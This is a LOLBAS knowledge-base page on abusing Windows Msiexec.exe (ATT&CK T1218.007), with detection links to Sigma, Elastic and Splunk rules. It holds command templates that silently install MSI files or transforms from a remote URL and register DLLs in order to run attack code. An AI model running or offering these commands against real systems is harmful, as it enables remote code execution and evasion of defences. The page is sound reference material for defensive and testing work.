---
title: "Msiexec.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Msiexec.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Msiexec.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1218.007"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Used by Windows to execute msi files

## Paths

- `C:\Windows\System32\msiexec.exe`
- `C:\Windows\SysWOW64\msiexec.exe`

## Commands

### 1. Execute

Installs the target .MSI file silently.

```cmd
msiexec /quiet /i {PATH:.msi}
```

- Use Case: Execute custom made msi file with attack code
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

### 2. Execute

Installs the target remote & renamed .MSI file silently.

```cmd
msiexec /q /i {REMOTEURL}
```

- Use Case: Execute custom made msi file with attack code from remote server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

### 3. Execute

Calls DllRegisterServer to register the target DLL.

```cmd
msiexec /y {PATH_ABSOLUTE:.dll}
```

- Use Case: Execute dll files
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

### 4. Execute

Calls DllUnregisterServer to un-register the target DLL.

```cmd
msiexec /z {PATH_ABSOLUTE:.dll}
```

- Use Case: Execute dll files
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

### 5. Execute

Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.

```cmd
msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
```

- Use Case: Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
- Privileges: User
- Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218007-msiexec|T1218.007: Msiexec]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
- IOC: msiexec.exe retrieving files from Internet

## Resources

- {'Link': 'https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/'}
- {'Link': 'https://twitter.com/PhilipTsukerman/status/992021361106268161'}
- {'Link': 'https://badoption.eu/blog/2023/10/03/MSIFortune.html'}

## Acknowledgements

- {'Person': 'netbiosX', 'Handle': '@netbiosX'}
- {'Person': 'Philip Tsukerman', 'Handle': '@PhilipTsukerman'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml)
